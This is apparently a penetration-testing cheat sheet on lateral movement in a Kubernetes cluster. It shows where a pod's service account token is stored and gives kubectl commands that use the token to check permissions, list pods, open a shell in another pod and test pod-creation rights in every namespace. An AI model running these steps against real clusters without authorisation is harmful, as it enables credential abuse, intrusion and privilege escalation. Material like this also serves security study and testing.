# Lateral Movement in the Cluster

### Kubernetes stores the token of the service account running a pod in 

    /var/run/secrets/kubernetes.io/serviceaccount/token

## Token type: JWT signed by the cluster

## TIP: If an account can do * verb on *.* resource, it means it is a cluster-admin, which also means we are able to run any kubectl command we want.

#### 1) Check permissions of our account

    kubectl auth can-i --list --token=${TOKEN} --certificate-authority=ca.crt

#### 2) Enumerate pods

    kubectl get pods --token={TOKEN}

#### 3) This gives us a shell on the target pod

    kubectl exec -it POD --token={TOKEN} -- /bin/bash 

#### 4) Check where you can create pods in the cluster

    kubectl --token=TOKEN --certificate-authority=ca.crt --server=https://IP_ADDRESS:8443 auth can-i create pods --all-namespaces

### Interesting results from --list output: Create, get list
